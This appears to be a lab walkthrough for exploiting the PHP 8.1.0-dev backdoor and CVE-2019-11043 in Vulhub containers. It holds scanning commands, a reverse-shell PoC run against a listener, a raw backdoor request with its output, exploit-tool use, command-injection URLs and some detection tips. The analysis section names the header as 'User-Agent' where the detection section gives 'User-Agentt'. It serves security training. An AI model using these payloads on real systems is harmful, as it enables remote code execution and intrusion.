# 🛡️ **PHP Version Detection and Vulnerabilities**

This guide walks through setting up two PHP-based vulnerable environments using Vulhub, perfect for learning real-world PHP exploitation.

🔗 **Knife - HTB:** [HackTheBox Machine - Knife](https://www.hackthebox.com/machines/knife)

---

## 🔍 **PHP Version Detection**

**Detect the PHP version running on a target server:**

```bash
curl -I http://<target-ip>:<port>/
curl -I http://10.10.10.242:80/
```

📄 **Example Response:**
```bash
HTTP/1.1 200 OK
Date: Fri, 18 Apr 2025 11:01:11 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8
```

**Or use Nmap's `http-php-version` script:**

```bash
nmap -p <port> --script=http-php-version <target-ip>
nmap -v -sT -sV -A -O --script=http-php-version.nse -p 80 10.10.10.242
```

---

## 💀 **PHP 8.1.0-dev Backdoor Exploitation**

🔗 **Reference:** [PHP 8.1.0-dev Backdoor RCE GitHub](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/README.md)

---

### 🐳 **Docker Installation**

**Update and install Docker:**

```bash
apt update
apt install docker docker-compose -y
```

**Or install using official script:**

```bash
curl -sSL https://get.docker.com/ | sh
```

**Manage Docker service:**

```bash
systemctl restart docker
systemctl enable docker
systemctl status docker
```

---

### 🏠 **Clone Vulhub and Build Vulnerable Container**

```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub/php/8.1-backdoor/
docker-compose build
docker-compose up -d
```

---

## 🖥️ **Port and Service Checks**

**Check if Docker or vulnerable environment is up:**

```bash
netstat -nltup | grep 5000
netstat -nltup | grep docker
```

---

## 🔎 **Nmap Scanning for PHP Detection**

**Basic detection and version scan:**

```bash
nmap -v -p 8080 -sT -sC -sV -A -O 192.168.1.23
```

**PHP version detection:**

```bash
nmap -v -p 8080 -sT -sV -A -O --script=http-php-version.nse 192.168.1.23
```

---

## 📚 **Exploitation Resources**

- 📄 [Exploit-DB Link](https://www.exploit-db.com/exploits/49933)
- 📄 [PoC GitHub Repo](https://github.com/flast101/php-8.1.0-dev-backdoor-rce)

---

## 🎯 **Reverse Shell Exploitation**

### **Download the PoC:**

```bash
wget https://raw.githubusercontent.com/flast101/php-8.1.0-dev-backdoor-rce/main/revshell_php_8.1.0-dev.py
```

### **View Usage:**

```bash
python3 revshell_php_8.1.0-dev.py -h
```

### **Run the Exploit:**

**Start a listener:**

```bash
nc -lvnp 443
```

**Execute the script:**

```bash
python3 revshell_php_8.1.0-dev.py http://192.168.1.23:8080/ 192.168.1.7 443
```

---

## 🚨 **Malicious Request Example**

```bash
GET / HTTP/1.1
Host: 192.168.1.28:8080
User-Agent: zerodiumsystem('uname -a');
Accept: */*
Connection: keep-alive
```

---

## 📈 **Observed Response**

```bash
HTTP/1.1 200 OK
X-Powered-By: PHP/8.1.0-dev
Linux 1249b721bf95 6.1.0-32-amd64 Debian 6.1.129-1 x86_64 GNU/Linux
hello world
```

---

## 🔬 **Analysis**

- The backdoored PHP interprets any header starting with **User-Agent** as PHP code.
- Payload `zerodiumsystem('uname -a');` executes shell commands.
- Successful response confirms **Remote Code Execution (RCE)**.

---

## 🛡️ **Recommendations for Detection**

- Monitor suspicious headers like **User-Agentt**, **X-Cmd**, etc.
- Watch for PHP versions like **PHP/8.1.0-dev** in `X-Powered-By`.
- Use **tcpdump**, **Wireshark**, or **Suricata** for traffic monitoring.

---

## 🧹 **Cleanup**

```bash
docker-compose down -v
```

---

# ⚠️ **CVE-2019-11043 - PHP-FPM Remote Code Execution**

🔗 **Reference:** [Vulhub - CVE-2019-11043](https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043)

---

## 🛠️ **Environment Setup**

```bash
cd vulhub/php/CVE-2019-11043/
docker-compose build
docker-compose up -d
netstat -nltup | grep 8080
```

---

### 📋 **Create PHP Info Page**

```bash
vim www/phpinfo.php
```

Add inside the file:

```php
<?php
phpinfo();
?>
```

---

## 🔧 **Exploitation Tool - Phuip-Fpizdam**

### **Install Using Go:**

```bash
go install github.com/neex/phuip-fpizdam@latest
```

**Run the tool:**

```bash
/root/go/bin/phuip-fpizdam "http://192.168.1.220:8080/index.php"
```

### **Manual Install:**

```bash
git clone https://github.com/neex/phuip-fpizdam.git
cd phuip-fpizdam
go install .
/root/go/bin/phuip-fpizdam "http://192.168.1.23:8080/index.php"
```

---

## 🌐 **Command Injection Example URLs**

Test by visiting:

- `http://192.168.1.23:8090/index.php?a=id`
- `http://192.168.1.23:8080/index.php?a=ls`

---

## 📝 **Important Notes**

- Ensure firewall rules allow incoming connections.
- Always run vulnerable labs in an isolated virtual environment.
- For CVE-2019-11043, adjust payload padding if exploitation fails.

---

